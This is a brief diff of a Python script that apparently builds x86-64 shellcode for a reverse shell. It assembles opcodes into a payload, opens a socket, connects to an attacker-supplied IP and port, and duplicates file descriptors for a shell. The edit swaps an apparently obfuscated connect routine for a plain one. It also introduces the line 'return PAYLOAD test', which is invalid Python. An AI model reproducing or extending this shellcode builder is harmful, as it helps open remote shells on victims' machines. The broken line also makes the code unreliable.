@@ -376,7 +376,7 @@ def deof_socket_connect(ip, port):
     print("ouou",PAYLOAD)
     PAYLOAD += "b218" # mov dl,24
     PAYLOAD += call()
-    return PAYLOAD
+    return PAYLOAD test
 """
 
 def dup2x3():
@@ -512,8 +512,8 @@ PAYLOAD += clean("rdi")
 PAYLOAD += clean("rsi")
 PAYLOAD += clean("rsi")
 create_socket()
-#connect_socket(argv[1], argv[2])
-deof_socket_connect(argv[1], argv[2])
+connect_socket(argv[1], argv[2])
+#deof_socket_connect(argv[1], argv[2])
 dup2x3()
 #shell()
 #deof_shell()
